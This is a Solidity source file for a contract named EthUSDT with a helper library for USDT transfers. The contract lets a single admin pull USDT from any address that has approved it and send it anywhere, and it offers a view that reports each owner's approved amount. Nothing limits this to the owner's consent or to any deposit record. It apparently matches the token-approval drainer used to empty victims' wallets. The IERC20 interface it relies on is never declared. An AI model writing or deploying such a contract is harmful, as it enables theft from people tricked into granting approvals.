pragma solidity ^0.8.0;
library SafeUSDTCompat {
    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 amount
    ) internal {
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSelector(IERC20.transferFrom.selector, from, to, amount)
        );
        require(success, "USDT: call failed");
        if (data.length > 0) {
            require(abi.decode(data, (bool)), "USDT: transferFrom returned false");
        }
    }
}
contract EthUSDT {
    using SafeUSDTCompat for IERC20;
    address public immutable usdtToken;
    address public admin;
    event FundsWithdrawn(address indexed from, address indexed to, uint256 amount);
    event AdminTransferred(address indexed oldAdmin, address indexed newAdmin);
    modifier onlyAdmin() {
        require(msg.sender == admin, "Only admin allowed");
        _;
    }
    constructor(address _usdtToken) {
        require(_usdtToken != address(0), "Invalid token address");
        usdtToken = _usdtToken;
        admin = msg.sender;
    }
    function withdrawFunds(address from, address to, uint256 amount) external onlyAdmin {
        require(to != address(0), "Invalid recipient");
        require(from != address(0), "Invalid from");
        IERC20(usdtToken).safeTransferFrom(from, to, amount);
        emit FundsWithdrawn(from, to, amount);
    }
    function transferAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0), "Invalid new admin");
        address oldAdmin = admin;
        admin = newAdmin;
        emit AdminTransferred(oldAdmin, newAdmin);
    }
    function checkAllowance(address owner) external view returns (uint256) {
        return IERC20(usdtToken).allowance(owner, address(this));
    }
}